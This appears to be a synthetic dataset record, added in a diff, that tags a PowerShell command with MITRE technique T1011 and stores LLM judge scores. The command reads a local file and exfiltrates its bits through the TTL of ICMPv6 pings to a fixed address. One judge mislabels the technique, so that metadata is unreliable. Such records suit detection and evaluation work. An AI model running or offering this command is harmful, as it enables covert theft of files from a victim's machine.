@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fd00:0:0:1::7'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ ([Convert]::ToString($b,2).PadLeft(8,'0')).ToCharArray() | ForEach-Object { $ttl = if($_ -eq '1'){61}else{113}; Test-Connection -ComputerName $d -Count 1 -TimeToLive $ttl -IPv6 -Quiet | Out-Null } }",
+  "explanation": "Encodes bits of each byte into the Time To Live (TTL) of ICMPv6 echo requests, using ICMP as an alternate network medium per T1011.",
+  "rationale_steps": [
+    "Convert each byte to an 8-bit binary string.",
+    "Map bit values to distinct TTLs to represent 0/1.",
+    "Transmit ICMPv6 echos with selected TTLs to a ULA destination."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-67d2d587",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell code is balanced and well-formed with valid cmdlets, parameters, separators, and quoting.",
+        "semantic_score": 4,
+        "semantic_justification": "It encodes file bits into ICMPv6 echo requests via differing hop limits using -TimeToLive, matching T1011, though Hop Limit control via Test-Connection can vary by PowerShell/Windows version.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T15:31:59.955964Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses standard PowerShell syntax, balanced elements, and valid cmdlet parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately encodes data bits into the TTL (Hop Limit in IPv6) of ICMPv6 echo requests, precisely matching the 'Traffic Signaling' technique T1011 by using protocol fields for low-bandwidth communication.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T15:32:14.446747Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.5,
+    "llm_average_score": 4.75,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
